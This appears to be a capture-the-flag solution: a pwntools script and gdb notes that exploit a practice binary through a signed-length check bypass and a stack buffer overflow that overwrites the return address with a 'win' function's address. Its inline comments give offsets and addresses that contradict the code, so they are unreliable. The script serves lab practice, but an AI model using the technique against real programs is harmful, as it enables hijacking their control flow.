"""
Terminal 1:
import pwn
io = pwn.process("/challenges/mem/level6_testing2")
#TODO: get <pid>

Terminal 2: 
gdb -p <pid>
c

Terminal 1:
io.send("-1\n") # neg value because there is a check for the max value (0x3e)
io.send(pwn.cyclic(1000, n=8))

Terminal 2: 
#TODO: get return addr <retq>

Terminal 1: 
pwn.cyclic_find(<retq>, n=8) #prints starting position of return address

Terminal 2: 
p win #prints address of win function

Run script below. Note where the numbers are from.
"""
import pwn

io = pwn.process("/challenges/mem/level6_testing2")

io.send("1000\n") # input length, incl length of win address (usually 8 bytes)

payload = b"a"*152 + pwn.p64(0x40191e) # 72 is retq, 0x40213d is win function addr

io.send(payload)

output = io.readall().decode('ascii')
print(output)